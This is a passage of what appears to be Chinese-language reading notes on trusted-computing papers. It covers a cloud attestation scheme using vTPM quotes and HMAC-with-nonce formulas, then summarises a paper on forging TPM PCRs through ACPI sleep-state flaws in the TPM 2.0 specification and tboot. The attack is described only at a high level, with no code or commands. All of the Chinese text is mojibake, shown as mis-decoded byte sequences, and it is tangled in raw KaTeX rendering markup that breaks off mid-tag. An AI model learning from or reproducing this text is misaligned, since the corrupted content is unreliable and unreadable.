style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ä¸Šçš„æ‰€æœ‰<code>ICA</code>å¹¶è¡Œå‘é€ä¿¡æ¯æ”¶é›†è¯·æ±‚ï¼Œæ¯ä¸ªè¯·æ±‚éƒ½åŒ…å«ä¸å¯é¢„æµ‹çš„éšæœºæ•°ï¼ˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">nonce</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span></span></span></span>ï¼‰ã€‚</p><p>ç„¶åï¼Œè™šæ‹Ÿæœºä¸­çš„<code>ICA</code>æ ¹æ®å…¬å¼(9)ç”Ÿæˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>P</mi><mi>C</mi><msub><mi>R</mi><mrow><mn>2</mn><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">vPCR_{2j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>çš„å“ˆå¸Œçš„æ¶ˆæ¯éªŒè¯ç (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">HMAC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>)ã€‚</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>v</mi><mi>P</mi><mi>C</mi><msubsup><mi>R</mi><mrow><mn>2</mn><mi>j</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msubsup><mo>=</mo><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi><mo stretchy="false">(</mo><mi>v</mi><mi>P</mi><mi>C</mi><msub><mi>R</mi><mrow><mn>2</mn><mi>j</mi></mrow></msub><mo separator="true">,</mo><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(9)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">vPCR&#x27;_{2j}=HMAC(vPCR_{2j},nonce)\tag9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.185em;vertical-align:-0.3831em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-2.453em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3831em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.185em;vertical-align:-0.3831em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">9</span></span><span class="mord">)</span></span></span></span></span></span></p><p>éšåï¼Œ<code>ICA</code>ä½¿ç”¨<code>vTPM</code>æ ¹æ®å¼(10)è¿›è¡Œç­¾åï¼Œå¹¶å°†ç”Ÿæˆçš„<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mi>u</mi><mi>o</mi><mi>t</mi><msub><mi>e</mi><mrow><mi>V</mi><msub><mi>M</mi><mrow><mn>2</mn><mi>j</mi></mrow></msub></mrow></msub></mrow><annotation encoding="application/x-tex">Quote_{V M_{2j}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0307em;vertical-align:-0.3473em;"></span><span class="mord mathnormal">Q</span><span class="mord mathnormal">u</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3473em;"><span></span></span></span></span></span></span></span></span></span>å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>M</mi><msub><mi>L</mi><mrow><mn>2</mn><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">vML_{2j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>ä¸€èµ·å‘é€ç»™<code>TA</code>ã€‚</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>Q</mi><mi>u</mi><mi>o</mi><mi>t</mi><msub><mi>e</mi><mrow><mi>V</mi><msub><mi>M</mi><mrow><mn>2</mn><mi>i</mi></mrow></msub></mrow></msub><mo>=</mo><mi>s</mi><mi>i</mi><mi>g</mi><mo stretchy="false">(</mo><mi>v</mi><mi>P</mi><mi>C</mi><msub><mi>R</mi><mrow><mn>2</mn><mi>j</mi></mrow></msub><mo separator="true">,</mo><mi>v</mi><mi>P</mi><mi>C</mi><msubsup><mi>R</mi><mrow><mn>2</mn><mi>j</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msubsup><mo separator="true">,</mo><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi><msub><mo stretchy="false">)</mo><mrow><mi>A</mi><mi>I</mi><mi>K</mi></mrow></msub></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(10)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">Quote_{VM_{2i}}=sig(vPCR_{2j},vPCR&#x27;_{2j},nonce)_{AIK}\tag{10}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9334em;vertical-align:-0.2501em;"></span><span class="mord mathnormal">Q</span><span class="mord mathnormal">u</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.185em;vertical-align:-0.3831em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-2.453em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3831em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="tag"><span class="strut" style="height:1.185em;vertical-align:-0.3831em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">10</span></span><span class="mord">)</span></span></span></span></span></span></p><p>åŒæ ·ï¼Œä¸»æœºä¸­çš„<code>ICA</code>æ ¹æ®å¼ï¼ˆ11ï¼‰è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>C</mi><msub><mi>R</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">PCR_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>çš„<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">HMAC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>ï¼Œå¹¶åˆ©ç”¨<code>TPM</code>æ‰§è¡Œç­¾åæ“ä½œï¼ˆå…¬å¼(12)ï¼‰ã€‚</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>P</mi><mi>C</mi><msubsup><mi>R</mi><mn>2</mn><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msubsup><mo>=</mo><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi><mo stretchy="false">(</mo><mi>P</mi><mi>C</mi><msub><mi>R</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(11)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">PCR&#x27;_2=HMAC(PCR_2,nonce)\tag{11}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0489em;vertical-align:-0.247em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-2.453em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">11</span></span><span class="mord">)</span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>Q</mi><mi>u</mi><mi>o</mi><mi>t</mi><msub><mi>e</mi><mrow><mi>H</mi><mi>o</mi><mi>s</mi><msub><mi>t</mi><mn>2</mn></msub></mrow></msub><mo>=</mo><mi>s</mi><mi>i</mi><mi>g</mi><mo stretchy="false">(</mo><mi>P</mi><mi>C</mi><msub><mi>R</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>P</mi><mi>C</mi><msubsup><mi>R</mi><mn>2</mn><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msubsup><mo separator="true">,</mo><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(12)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">Quote_{Host_2}=sig(PCR_2,PCR_2&#x27;,nonce)\tag{12}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9334em;vertical-align:-0.2501em;"></span><span class="mord mathnormal">Q</span><span class="mord mathnormal">u</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">Hos</span><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-2.453em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.052em;vertical-align:-0.2501em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">12</span></span><span class="mord">)</span></span></span></span></span></span></p></li></ul><h2 id="ç–‘é—®-2">ç–‘é—®</h2><p>å¦‚æœåœ¨å¾ªç¯éªŒè¯çš„è¿‡ç¨‹ä¸­ï¼Œåªæœ‰ä¸€ä¸ªäº‘æœåŠ¡å™¨çš„æƒ…å†µä¸‹ï¼Œåº”è¯¥è®©è°æ¥éªŒè¯å®ƒã€‚ä¹Ÿå°±æ˜¯n=1çš„æ—¶å€™ï¼Œå¦‚ä½•åšéªŒè¯ã€‚</p><h1 id="A-Bad-Dream-Subverting-Trusted-Platform-Module-While-You-Are-Sleeping">A Bad Dream: Subverting Trusted Platform Module While You Are Sleeping</h1><h2 id="Abstract-2">Abstract</h2><p>ä¸¤ç§é’ˆå¯¹ç”µæºç®¡ç†çš„å¯ä¿¡å¹³å°æ¨¡å—ï¼ˆTPMï¼‰æ”»å‡»ã€‚ä¸€ç§æ”»å‡»æ˜¯åˆ©ç”¨TPM 2.0è§„èŒƒä¸­ç”¨äºåº¦é‡çš„é™æ€ä¿¡ä»»æ ¹ï¼ˆSRTMï¼‰çš„è®¾è®¡ç¼ºé™·ã€‚å¦ä¸€ç§æ”»å‡»æ˜¯åˆ©ç”¨tbootä¸­çš„ä¸€ä¸ªå®ç°ç¼ºé™·ï¼Œtbootæ˜¯è‹±ç‰¹å°”å¯ä¿¡æ‰§è¡ŒæŠ€æœ¯ï¼ˆTrusted Execution Technologyï¼‰ä¸­æœ€æµè¡Œçš„æµ‹é‡å¯åŠ¨ç¯å¢ƒã€‚</p><h2 id="Introduction-2">Introduction</h2><p>ä»‹ç»äº†å¯ä¿¡å¹³å°æ¨¡å—ï¼ˆTrusted Platform Moduleï¼Œ <code>TPM</code>ï¼‰çš„åŸºæœ¬æ¦‚å¿µï¼Œä»¥åŠåº¦é‡è¿‡ç¨‹å’Œ<code>PCR</code>ã€‚</p><p>æŒ‡å‡º<code>TPM</code>èŠ¯ç‰‡éœ€è¦ä¸å…¶ä»–å›ºä»¶å…±åŒå·¥ä½œï¼Œåˆä½œæœºåˆ¶æ— æ³•æ˜ç¡®è§„å®šå°†å¯¼è‡´å®‰å…¨æ¼æ´ã€‚è€Œ<mark>ç”µæºç®¡ç†</mark>çš„å·¥ä½œæ–¹å¼å°±éå¸¸å¤æ‚ï¼Œå› ä¸ºæ¯ä¸ªå¤–å›´è®¾å¤‡éƒ½æœ‰è‡ªå·±çš„ç”µæºçŠ¶æ€ï¼Œç‹¬ç«‹äºç³»ç»ŸèŒƒå›´çš„ç”µæºçŠ¶æ€ã€‚</p><p>ç”µæºæ¥å£ï¼ˆAdvanced Configuration and Power Interfaceï¼Œ <code>ACPI</code>ï¼‰æ˜¯ä¸€ç§å¼€æ”¾çš„è¡Œä¸šè§„èŒƒï¼Œå®ƒä½¿ä»¥æ“ä½œç³»ç»Ÿä¸ºä¸­å¿ƒçš„æ™ºèƒ½å’ŒåŠ¨æ€ç®¡ç†èƒ½å¤Ÿä¸ç”µæºç®¡ç†æ„ŸçŸ¥è®¾å¤‡ï¼ˆå¦‚cpuã€ç½‘ç»œã€å­˜å‚¨å’Œå›¾å½¢å¤„ç†å•å…ƒï¼‰è¿›è¡Œåè°ƒã€‚</p><p>å½“ç”µæºçŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œ<code>TPM</code>ä¸èƒ½å®‰å…¨åœ°ä¿æŒçŠ¶æ€ã€‚åœ¨ä¸¤ç§ç±»å‹çš„<code>RTM</code>ï¼ˆé™æ€å’ŒåŠ¨æ€ï¼‰ä¸­éƒ½å‘ç°äº†æ¼æ´ï¼Œé™æ€<code>RTM </code>ï¼ˆ<code>SRTM</code>ï¼‰çš„æ¼æ´æ˜¯ç”±TPM2.0è§„èŒƒçš„è®¾è®¡æ¼æ´é€ æˆçš„ã€‚åŠ¨æ€<code>RTM </code>ï¼ˆ<code>DRTM</code>ï¼‰çš„æ¼æ´æ˜¯ç”±äºå¼€æºé¡¹ç›®<code>tboot</code>ä¸­çš„ä¸€ä¸ªé”™è¯¯é€ æˆçš„ã€‚</p><p>è¿™äº›æ¼æ´ä½¿æ”»å‡»è€…å¯ä»¥åœ¨ç³»ç»Ÿå”¤é†’æ—¶é‡ç½®å’Œä¼ªé€ <code>pcr</code>ã€‚</p><h2 id="Background">Background</h2><h3 id="TPM-Technology">TPM Technology</h3><p>ä»‹ç»äº†å¯ä¿¡é“¾ä»¥åŠä¿¡ä»»åº¦é‡æ—¶<code>PCR</code>çš„ä½œç”¨ã€<code>TPM</code>çš„ä½œç”¨ï¼Œå¹¶ä¸”æåˆ°äº†æ ¸å¿ƒRTMï¼ˆCRTMï¼‰çš„ä½œç”¨ã€‚ä»‹ç»äº†<code>SRTM</code>å’Œ<code>DRTM</code>çš„å¯åŠ¨è¿‡ç¨‹ã€‚</p><h3 id="ACPI-Sleeping-States">ACPI Sleeping States</h3><p>ä»‹ç»äº†<code>ACPI</code>ä»¥åŠå››ç§å…¨å±€ç”µæºçŠ¶æ€ï¼šå·¥ä½œçŠ¶æ€ï¼ˆ<code>G0 </code>æˆ– <code>S0</code>ï¼‰ã€ç¡çœ çŠ¶æ€ï¼ˆ<code>G1</code>ï¼‰ã€è½¯å…³æœºçŠ¶æ€ï¼ˆ<code>G2</code>ï¼‰å’Œæœºæ¢°å…³æœºçŠ¶æ€ï¼ˆ<code>G3</code>ï¼‰ã€‚ç¡çœ çŠ¶æ€åˆ†ä¸ºå››ç§ï¼š</p><ul><li>S1</li><li>S2</li><li>S3</li><li>S4</li></ul><p>æ¦‚è¿°ä¿å­˜å’Œæ¢å¤<code>TPM</code>çŠ¶æ€çš„æ­¥éª¤</p><p><img 